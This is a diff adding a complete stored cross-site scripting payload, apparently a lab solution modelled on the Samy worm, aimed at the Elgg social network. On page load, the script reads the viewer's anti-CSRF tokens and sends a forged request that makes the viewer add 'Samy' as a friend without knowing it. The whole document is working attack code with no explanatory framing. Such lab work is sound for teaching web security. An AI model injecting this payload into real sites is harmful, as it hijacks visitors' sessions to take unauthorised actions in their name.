@@ -1,0 +1,19 @@
+<script type="text/javascript">
+  window.onload = function () {
+    var Ajax = null;
+    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+    var guid = "friend=" + elgg.page_owner.guid;
+    //Construct the HTTP request to add Samy as a friend.
+
+    var sendurl = "/action/friends/add?" + guid + ts + token + ts + token; //FILL IN
+
+    // if(elgg.page_owner.guid != elgg.session.user.guid) {
+    //Create and send Ajax request to add friend
+    Ajax = new XMLHttpRequest();
+    Ajax.open("GET", sendurl, true);
+    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    Ajax.send();
+    // }
+  };
+</script>
